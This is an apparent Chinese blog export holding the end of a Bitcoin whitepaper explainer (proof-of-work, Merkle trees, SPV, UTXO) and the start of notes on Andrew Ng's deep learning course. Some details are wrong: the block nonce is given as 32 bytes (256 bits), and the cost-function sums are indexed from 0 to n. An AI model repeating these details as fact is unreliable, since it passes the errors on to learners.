<li><p>若新区块不满足要求，比如：哈希值不正确、或时间小于上一个区块的时间等，那其它参与者将不会认同这个区块，区块被抛弃，<strong>区块中的交易将无效</strong> 。</p>
</li>
<li><p>若新区块被大家认可，<strong>区块中的交易才算成功，新区块的哈希值将会被包含在下一个更新的区块中，依次形成一个链条</strong> ，这就是区块链的雏形。</p>
</li>
</ol>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_4.png" alt="1"></p>
<p>在论文中，把负责创建新区块的节点称为“时间戳服务器”，这个“时间戳服务器”并不是一个中心服务器，比特币中任何节点都可以成为“时间戳服务器”。不过，并不是每一个节点都愿意成为“时间戳服务器”，毕竟谁愿意干苦力活呢？这个问题后文再进行解答。</p>
<p>此处还有一个关键点，<strong>为什么区块要包含上一个区块的哈希值呢</strong> ？假设有个恶意节点打算篡改区块链上某个区块的交易数据，区块数据就会发生变化，区块的哈希值也会改变。因此，恶意节点需要重新计算区块哈希值，并修改下一个区块中的prev_block_hash(上一个区块的哈希值)。而这又导致下一个区块的数据及其哈希值发生改变，又要修改下下个区块中的prev_block_hash，一直要修改到区块链的最后一个区块。而后文我们会提到，每一次修改区块数据、重新计算区块哈希值，都将付出昂贵的代价。因此，恶意节点篡改数据的成本将非常高，甚至可能高于他篡改数据所获得的收益。</p>
<p>有了这个区块链雏形，就能保证交易的先后顺序，防止双重支付。但是，新的问题又出现了：由于网络存在延迟，新交易被公布之后，每个节点接收到的时间都不同。同一笔交易，在不同节点中，可能在不同的区块里。而新区块被发布之后，也可能在不同时间到达不同节点。如此，每个节点的区块链都可能不相同，交易序列则会出现混乱，那<strong>大家怎么对一条正确的区块链达成共识呢？</strong></p>
<h3 id="1-4-工作量证明"><a href="#1-4-工作量证明" class="headerlink" title="1.4. 工作量证明"></a>1.4. 工作量证明</h3><p>中心化系统相当于权力集中制，中心者负责系统中的决策，中心者所保存的交易序列肯定是被大家都认可的，所有交易也必须通过中心者的检验与确定。至于比特币这样的P2P（点对点）模式，则是民主制，需要大家共同决策并达成一致，而规定如何决策并达成一致的被称为<strong>共识算法</strong> 。</p>
<p>最简单的共识算法就是一人一票的投票机制，票数最少的服从票数多的。但这个机制会出现恶意者收买大多数，从而获胜的情况。尤其在网络世界中，还可能出现“女巫攻击”——同时伪造多个节点参与投票从而获胜。因此这种简单的共识算法在网络中肯定是不可行的。</p>
<p>在比特币中，中本聪提出了一种出色的共识算法——<strong>工作量证明(PoW, proof-of-work)</strong> 。工作量证明通过计算机算力进行投票，拥有最大计算工作量的一方获胜，换句话说：<strong>谁干的活多就听谁的</strong> （“谁”指一群人）。那怎么证明谁干的活多呢？谁的区块链最长谁干的活就最多，而在比特币系统中，最长的链就代表大多数所认同的。但根据“时间戳服务器”中所提到的，区块创建后只要计算哈希值，整个过程并不需要高时间复杂度的计算，那只要用高算力的机器一会就能超过系统中的最长链。</p>
<p>因此，为了增加区块创建的难度，中本聪向每个区块中添加了一个<strong>随机数字段(nonce)</strong> ，并规定：<strong>每次创建区块，计算区块哈希值时，都要找到一个随机数，使得整个区块的哈希值小于某个数</strong> （哈希值前有n个0），如此区块才能满足要求、被大家认可。由于哈希函数不可逆，无法从输出高效地推导出输入，只能通过尝试每一个输入，直到输出满足要求，也就是遍历随机数的值，而这个随机数有32字节（256位，10的77次方）。整个过程不仅靠算力，也靠一定的运气，因此这个过程又被称为<strong>挖矿</strong> ，至于挖到什么，将在后文介绍。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_5.png" alt="1"></p>
<p>当然，计算机算力每年都在提高，怎么保证难度一直合理呢？比特币规定<strong>区块哈希数值前面0的个数为难度值，它会随着计算机算力的提高而增大</strong> ，0个数越多挖矿成功的概率也就越小、工作量也就越大。这个难度值会由比特币社区规定，当新区块未达到难度值（即区块哈希值前面0的个数不够），这个区块将不会被大家所接受。</p>
<p>由于区块会包含上一个区块的哈希值，恶意节点想要修改过去区块，则必须重做之后所有的区块从而赶上诚实节点们的工作（恶意节点在重做区块的同时，诚实节点也在创建新区块），而这个概率呈指数级递减。</p>
<h3 id="1-5-网络"><a href="#1-5-网络" class="headerlink" title="1.5. 网络"></a>1.5. 网络</h3><p>上文介绍了工作量证明这种共识算法的规则，接下来将介绍其在比特币网络中的具体运行步骤：</p>
<ol>
<li><p>新交易向所有节点广播。</p>
</li>
<li><p>每个节点将新交易收集到一个区块。</p>
</li>
<li><p>每个节点为它的区块寻找工作量证明。即挖矿，找随机数使得区块哈希值满足难度要求。</p>
</li>
<li><p>当一个节点找到了工作量证明，就向所有节点广播这个区块。</p>
</li>
<li><p>节点只有在<strong>区块内所有交易都是有效的且之前没有被支付</strong> 的情况下接收这个区块。同时，也会检查这个区块是否满足要求。</p>
</li>
<li><p>节点通过在链中创建下一个区块时，将这个区块的哈希值作为上一个区块哈希值的方式，表示对这个区块的接受。</p>
</li>
</ol>
<p><strong>节点总是认为最长的链为正确的并持续致力于延长它。</strong></p>
<p>如果两个节点同时广播了不同的下一个区块，有些节点可能先收到其中一个而其他节点先收到另一个。这种情况，节点基于他们收到的第一个区块工作，但是也保存另一个分支以防它变为更长的链。当下一个工作量证明被找到后僵局就会被打破从而其中一个分支变得更长；在另一个分支上工作的节点将切换到更长的链上来。</p>
<p>新交易的广播不必到达所有的节点。只要到达一些节点，不久就会进入到一个区块。区块广播也是能容忍消息丢失的。<strong>如果一个节点没有收到某个区块</strong> ，它将在收到下一个区块时发现它丢失了一个区块（上一个区块哈希值对不上），然后<strong>会跟其它节点请求这个区块</strong> 。</p>
<h3 id="1-6-激励"><a href="#1-6-激励" class="headerlink" title="1.6. 激励"></a>1.6. 激励</h3><p>前文提到，恶意节点想要修改过去的数据，需付出昂贵的代价，还很可能追不上诚实节点们的最长链，导致努力白费。但是，这毕竟有利可图，恶意节点们还是会想尽办法去尝试。而接下来所介绍的激励机制，将让这些恶意者陷入纠结，甚至转而为比特币系统做贡献。</p>
<p>比特币系统约定：<strong>区块创建者将获得一笔奖励币</strong> ，这份奖励将以交易的方式作为区块的第一笔交易。这笔交易由区块创建者自己创建，支付方可写成coinbase。当然，金额不能随便写，需要满足约定，不然其它人不会接受。但在比特币系统中，比特币是有限的，有可能到最后没有币发了。因此又约定：<strong>区块创建者可从交易中获得手续费</strong> 。自然，谁给的钱多，谁的交易就会先被纳入到区块中。</p>
<p>激励机制不仅<strong>解决了没有中心者如何发币的问题</strong> ，还有助于<strong>鼓励节点保持诚实</strong> 。</p>
<blockquote>
<p>如果一个贪心的攻击者有能力聚集比所有诚实节点更多的 CPU 算力，他将面临是以骗回已付款的方式欺诈别人还是使用这些算力生成新货币的抉择。他将发现遵守规则比破坏系统和他自己财产的有效性更有利，因为这些规则准许他获得比所有其他人都多的新货币。</p>
</blockquote>
<p>这里解释一下，<strong>为什么恶意者只能骗回已付款，而不能偷走别人的钱？</strong> 因为，若要创建一笔别人支付给恶意者的交易，或者将某笔交易的付款方修改成自己，则需要别人的私钥进行签名，而恶意者并没有别人的私钥，若恶意者用自己的私钥或不相干者的私钥，其它参与者将不会接受。</p>
<p>至此，比特币系统已基本成型！</p>
<h3 id="1-7-回收磁盘空间"><a href="#1-7-回收磁盘空间" class="headerlink" title="1.7. 回收磁盘空间"></a>1.7. 回收磁盘空间</h3><p><strong>一旦某个币的最新交易被写入区块链中，且其所在区块之后有足够多的区块，那之前的支付交易就可以被丢弃以节省磁盘空间。</strong> 为什么要保证交易所在区块之后有足够多的区块呢？因为系统中区块链可能会出现分叉的情况，有时一笔交易只在其中一个分支上，由于无法保证哪一条分支会成长为更长的链。所以，只有这个区块之后有足够多的区块，才能保证它被大多数人接受且在最长的链上，才能保证交易真正被写入区块链中，交易成功。而这个足够多通常是指<strong>6个区块</strong> 。</p>
<p>举例解释：E支付给A 10个币，A再将这10个币支付给B。当A支付B 10个币的交易被写入区块链中，且这笔交易所在区块之后已有超过6个区块，那之前E支付A 10个币的交易就可以丢弃以节省磁盘空间，因为它已经不可能再作为交易来源了。当然这是自愿的，也可以不丢弃。</p>
<p>而为了方便于此又不影响区块的哈希值，交易将用<strong>默克尔树(Merkle Tree)</strong> 保存，只有默克尔树的根节点才会被纳入区块哈希值的输入。于是，<strong>区块被分为区块头和区块体，区块头包括上一个区块的哈希值、随机数、区块创建时间戳、默克尔树根节点等，区块体包含交易及其它信息，区块哈希值只需计算区块头即可</strong> 。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_6.png" alt="1"></p>
<p>但不把交易纳入区块哈希值的计算，就不怕交易数据被篡改吗？这就不得不提到默克尔树了。默克尔树又称哈希树，是一颗完全二叉树，叶子节点的值是数据的哈希值，非叶子节点的值则是两个孩子节点的哈希值。当任意数据被篡改，其对应叶子节点的值会发生变化，进而影响父节点，层层向上最终影响到根节点。所以，<strong>只要由底向上重新计算默克尔树的根哈希值，就能检验数据是否被篡改</strong> 。同时，可以通过剪除树枝的方式压缩数据，比如在上图中，Tx0-Tx2可以被丢弃了，那只需要保存Tx3、Hash01、Hash2就可以了。</p>
<p>每个不包含交易的区块头大约是 80 bytes。如果每 10 分钟生成一个区块，每年仅生成80 B * 6 * 24 * 365 &#x3D; 4.2 MB。</p>
<h3 id="1-8-简化的支付验证"><a href="#1-8-简化的支付验证" class="headerlink" title="1.8. 简化的支付验证"></a>1.8. 简化的支付验证</h3><p>结合默克尔树，用户甚至<strong>只需拥有最长链的最后一区块的区块头</strong> ，就可以完成<strong>简化的支付验证(SPV, Simplified Payment Verification)</strong> 。</p>
<p>当他要验证某笔交易是否成功时，他可以通过向其他网络节点询问以确认他拥有了最长的链，并获取交易所在的区块头及其之后的区块头，同时获取交易所在的默克尔树分支。虽然他不能核实这个交易，但他可以通过<strong>计算并验证哈希值的方式，证明交易已经存在于某个区块的默克尔分支上</strong> 。如果交易已存在与某个区块中，且其后有足够多的区块，就可以确认网络已经接受了这笔交易。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_7.png" alt="1"></p>
<p>但是，如果部分网络被恶意者控制，简化验证将会变得比较脆弱。恶意者可以伪造一条更长的链和错误的交易，来欺骗他所控制网络中的节点。一种对策是发现一个无效区块时，发出警告。而为了更加独立的安全性以及更快的支付确认，比特币交易频繁的公司仍需保存最长的完整的区块链。</p>
<p>通常，保存所有区块数据且具备完整功能的节点被称为<strong>全节点</strong> ，而只保存少量区块数据的节点被称为<strong>轻节点</strong> 。轻节点常用来交易比特币，可通过SPV进行支付验证，常见的轻节点钱包有Electrum等。插一嘴：火币、OKEx等交易平台所提供的客户端软件并不是一个节点，所有支付都是由平台完成与验证的，用户需要信任且完全依赖平台，本质还是一个中心化系统。</p>
<h3 id="1-9-合并和分割交易额"><a href="#1-9-合并和分割交易额" class="headerlink" title="1.9. 合并和分割交易额"></a>1.9. 合并和分割交易额</h3><p>每笔需指定交易来源，但往往交易来源不止一处，比如：F支付A 5个币，E支付A 5个币，最终A将这10个币支付给B，那A支付B的这笔交易就有两个来源。所以为了方便，比特币规定<strong>一笔交易可有多个输入值来源，同时可有一至两个输出值</strong> （现在可以有多个输出）。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_8.png" alt="1"></p>
<p>那为什么要有两个输出呢？当输入值大于输出值时，可用于找零。同时，也可以表示支付方未花费的余额，这也被称为<strong>UTXO(Unspent Transaction Outputs，未花费交易输出)</strong> 。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_9.png" alt="1"></p>
<p>另外，若总输出值加起来小于总输入值，差值将作为交易的手续费支付给矿工。</p>
<h3 id="1-10-隐私"><a href="#1-10-隐私" class="headerlink" title="1.10. 隐私"></a>1.10. 隐私</h3><p>很好理解，比特币上的交易内容中，付款方与收款方都以他们的公钥显示，我们并不知道背后是谁。所以，比特币比普通货币更具隐匿性，当然这也为不法分子提供了一个天堂。</p>
<h3 id="1-11-计算"><a href="#1-11-计算" class="headerlink" title="1.11. 计算"></a>1.11. 计算</h3><p>通过计算证明恶意者链条赶上诚实者链条的概率，将随着区块数的增加而呈指数下降。感兴趣可自行阅读论文，此处不做讲解。</p>
<h2 id="2-总结"><a href="#2-总结" class="headerlink" title="2. 总结"></a>2. 总结</h2><p>2018年，大二，当时比特币突然火爆，币圈如火如荼，矿机卖得不亦说乎，我也有缘参加了一场介绍区块链的讲座，那是我第一次接触比特币及区块链。2019年，中央提出重视区块链的指示，区块链更是火得一塌糊涂。但当时也有老师说，应理性判断、不能盲目追捧。而区块链究竟是什么，众说纷纭，听到最多的是去中心化、分布式账本和割韭菜。这些笼统的解释，对于我这种技术人员肯定是不够。那究竟什么才是真正的区块链呢？它的内部又是如何实现的呢？区块链到底是能改变互联网的新技术，还是泡沫呢？种种疑问一直困扰着我，直到我阅读并理解完中本聪的这篇论文。</p>
<p>作为区块链白皮书，它涵盖了区块链的核心内容。虽然论文名字是比特币，论文中也未提及区块链。但比特币作为区块链最成功的应用，奠定了区块链的基础，是从0到1质变的过程，之后发展出来的以太坊、联盟链都是万变而未离其宗。</p>
<p>读完这篇论文，最大的感悟就是：中本聪yyds。其实区块链，并不像人工智能有许多深奥的数学公式，它所使用到的一些密码学技术，都是前人已经提出的，但偏偏被中本聪很巧妙地应用到比特币中。同时，再加上他所提出的新颖的分布式共识算法PoW，最终成就了比特币。比特币中所约定的许多规则都非常巧妙，就像当年董仲舒的推恩令，是一种博弈论，是一种阳谋。这些神来之笔，最终让比特币这样去中心的系统，变得非常安全而且充满活力。</p>
<p>每个人只需下载一个比特币客户端，就可以加入到这个系统中，不需要到任何中心去注册，不会受任何中心者的约束，而且还会主动想为整个系统做贡献。这要在现实生活中，就是一个无政府国度，但偏偏还生机勃勃。</p>
<p>吹也吹得差不多了，最后讲讲区块链的缺点。首先，是为不法分子提供了一个天堂，就像很多贪官喜欢把钱转换成比特币，这样就无法被追踪了。其次，就是对资源的消耗，矿机所消耗的电力是惊人的。</p>
<p>不管如何，我终于能拨开迷雾看清比特币的本质，而不再是管中窥豹了。</p>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>吴恩达深度学习第一课笔记 - 神经网络与深度学习</title>
    <url>/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>观看吴恩达深度学习视频的学习笔记。</p>
<p>此为第一课——神经网络与深度学习，共四周。</p>
<p>最后，B站牛逼。</p>
<span id="more"></span>

<h2 id="1-第一周-深度学习概论"><a href="#1-第一周-深度学习概论" class="headerlink" title="1. 第一周 - 深度学习概论"></a>1. 第一周 - 深度学习概论</h2><h3 id="1-1-欢迎"><a href="#1-1-欢迎" class="headerlink" title="1.1. 欢迎"></a>1.1. 欢迎</h3><p>课程简介，共5课：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C1-1.png" alt="1-1"></p>
<h3 id="1-2-什么是神经网络"><a href="#1-2-什么是神经网络" class="headerlink" title="1.2. 什么是神经网络"></a>1.2. 什么是神经网络</h3><p>略</p>
<h3 id="1-3-用神经网络进行监督学习"><a href="#1-3-用神经网络进行监督学习" class="headerlink" title="1.3. 用神经网络进行监督学习"></a>1.3. 用神经网络进行监督学习</h3><p>神经网络在监督学习中的应用：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C1-3-1.png" alt="1-3-1"></p>
<p>几种神经网络的图例：</p>
<ul>
<li><code>Standard NN</code>：标准神经网络</li>
<li><code>Convolution NN(CNN)</code>：卷积神经网络</li>
<li><code>Recurrent NN(RNN)</code>：递归神经网络</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C1-3-2.png" alt="1-3-2"></p>
<p>结构化数据（数据库数据）与非结构化数据（音频、图片、文字）：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C1-3-3.png" alt="1-3-3"></p>
<h3 id="1-4-为什么深度学习会兴起"><a href="#1-4-为什么深度学习会兴起" class="headerlink" title="1.4. 为什么深度学习会兴起"></a>1.4. 为什么深度学习会兴起</h3><p>当训练集较小时，各算法难分高下；当训练集足够大时，神经网络算法的性能要优于大部分机器学习算法。</p>
<p>随着数据规模和计算能力的发展，深度网络兴起了。</p>
<p>注：训练集<code>(x, y)</code>是由输入<code>x</code>和标签<code>y</code>组成的，<code>m</code>表示训练集大小。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C1-4-1.png" alt="1-4-1"></p>
<h3 id="1-5-关于这门课"><a href="#1-5-关于这门课" class="headerlink" title="1.5. 关于这门课"></a>1.5. 关于这门课</h3><p>略</p>
<h3 id="1-6-课程资源"><a href="#1-6-课程资源" class="headerlink" title="1.6. 课程资源"></a>1.6. 课程资源</h3><p>略</p>
<h2 id="2-第二周-神经网络基础"><a href="#2-第二周-神经网络基础" class="headerlink" title="2. 第二周 - 神经网络基础"></a>2. 第二周 - 神经网络基础</h2><h3 id="2-1-二分分类"><a href="#2-1-二分分类" class="headerlink" title="2.1. 二分分类"></a>2.1. 二分分类</h3><p>二分类：标签值 $y$ 要么为 0 要么为 1</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-1-2.png" alt="2-1-2"></p>
<p>一些符号的定义：</p>
<ul>
<li>$n$ 或 $n_x$：表示输入特征向量的维度</li>
<li>$x \in R^{n_x}$：输入的特征向量</li>
<li>$y \in {0, 1}$：标签值为0或1</li>
<li>$(x, y)$：一个训练样本</li>
<li>$m$：训练集的大小</li>
<li>$(x^{(i)}, y^{(i)})$：表示训练集中第i个训练样本</li>
<li>$X$：整个训练集的输入特征向量构成的矩阵，矩阵的维度为$(n_x, m)$</li>
<li>$Y$：整个训练集的输出标签构成的矩阵，矩阵的维度为$(1, m)$</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-1-1.png" alt="2-1-1"></p>
<h3 id="2-2-logistic-回归"><a href="#2-2-logistic-回归" class="headerlink" title="2.2. logistic 回归"></a>2.2. logistic 回归</h3><p>用 logistic 回归（逻辑回归）解决二分类问题：$\hat{y} &#x3D; sigmoid(w^Tx+b)$。注意：此处使用 $w^Tx+b$，而不使用 $\theta^Tx$。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-2-1.png" alt="2-2-1"></p>
<p>sigmoid 函数（是一种 logistics 函数）相关定义如下：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-2-2.png" alt="2-2-2"></p>
<h3 id="2-3-logistic-回归损失函数"><a href="#2-3-logistic-回归损失函数" class="headerlink" title="2.3. logistic 回归损失函数"></a>2.3. logistic 回归损失函数</h3><p>由上可知：$\hat{y}^{(i)} &#x3D; sigmoid(w^Tx+b)$：第i个样本的预测值。</p>
<p><strong>损失函数（Loss function）</strong> 使用：</p>
<p>$L(\hat{y}, y) &#x3D; -[y log\hat{y} + (1-y) log(1-\hat{y})]$</p>
<p><strong>注意</strong>：此处不使用平方差：$L(\hat{y}, y) &#x3D; \frac{1}{2}(\hat{y}-y)^2$，因为这是个二次函数，容易得到多个局部最优解，使用梯度下降法可能找不到全局最优值。</p>
<p>损失函数在单个训练样本中定义，它衡量了参数 w 和 b 在单个训练样本上的表现。</p>
<p><strong>成本函数（cost function）</strong> 则衡量参数 w 和 b 在全体训练样本上的表现，如下：</p>
<p>$J(w,b) &#x3D; \frac{1}{m} \displaystyle \sum_{i&#x3D;0}^nL(\hat{y}^{(i)}, y^{(i)})$</p>
<p>在训练 logistics 回归模型时，我们就是要找到合适的 w 和 b，让成本函数尽可能地小。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-3-1.png" alt="2-3-1"></p>
<h3 id="2-4-梯度下降法"><a href="#2-4-梯度下降法" class="headerlink" title="2.4. 梯度下降法"></a>2.4. 梯度下降法</h3><p>我们训练模型的目的是：找到合适的 w 和 b 使得 $J(w, b)$ 最小。</p>
<p>假设 w 和 b 是一维变量，$J(w, b)$ 的图像如图，它是一个凸函数，只有一个全局最小值。而我们的目的，就是找到这个最小值。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-4-1.png" alt="2-4-1"></p>
<p>假设 $J(w)$ 是一个一维函数，且是一个凸函数。</p>
<p>我们可以通过<strong>梯度下降法</strong>找到最小值。$w$ 初始位置任意，为了找到 $w$ 使得 $J(w)$ 最小，我们只需要重复如下步骤：</p>
<p>$w :&#x3D; w-\alpha \frac{dJ(w)}{dw}$</p>
<ul>
<li>$\alpha$：学习率，表示每一步 $w$ 变化的步长，决定 $J(w)$ 下降的速度。</li>
<li>$\frac{dJ(w)}{dw}$：导数，$(w, J(w))$ 处的斜率。</li>
</ul>
<p>在曲线越陡峭的地方，导数越大，$w$ 变化得越大，$J(w)$ 下降得越快；在曲线较缓和的地方，导数较小，$w$ 变化得小，$J(w)$ 下降得也慢。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-4-2.png" alt="2-4-2"></p>
<h3 id="2-5-导数"><a href="#2-5-导数" class="headerlink" title="2.5. 导数"></a>2.5. 导数</h3><p>略</p>
<h3 id="2-6-更多导数的例子"><a href="#2-6-更多导数的例子" class="headerlink" title="2.6. 更多导数的例子"></a>2.6. 更多导数的例子</h3><p>略</p>
<h3 id="2-7-计算图"><a href="#2-7-计算图" class="headerlink" title="2.7. 计算图"></a>2.7. 计算图</h3><p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-7-1.png" alt="2-7-1"></p>
<h3 id="2-8-计算图的导数计算"><a href="#2-8-计算图的导数计算" class="headerlink" title="2.8. 计算图的导数计算"></a>2.8. 计算图的导数计算</h3><p>注：$\frac{dFinalOutputVar}{dvar}$ 可看成 $dvar$</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-8-1.png" alt="2-8-1"></p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-8-2.png" alt="2-8-2"></p>
<h3 id="2-9-logistics-回归中的梯度下降法"><a href="#2-9-logistics-回归中的梯度下降法" class="headerlink" title="2.9. logistics 回归中的梯度下降法"></a>2.9. logistics 回归中的梯度下降法</h3><p>注：$L(a, y) &#x3D; -[y loga + (1-y) log(1-a)]$</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-9-1.png" alt="2-9-1"></p>
<h3 id="2-10-m-个样本的梯度下降"><a href="#2-10-m-个样本的梯度下降" class="headerlink" title="2.10. m 个样本的梯度下降"></a>2.10. m 个样本的梯度下降</h3><p>注：$J &#x3D; \frac{1}{m} \displaystyle \sum_{i&#x3D;0}^nL(\hat{y}^{(i)}, y^{(i)})$</p>
<p>在计算完 m 个样本上的累计误差&#x2F;成本函数 $J$ 和得到参数的累计梯度 $dw_i$ 之后，再进行参数更新。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-10-1.png" alt="2-10-1"></p>
<p>在之后的课程中，将提到用向量化<code>Vectorization</code>改善for循环。</p>
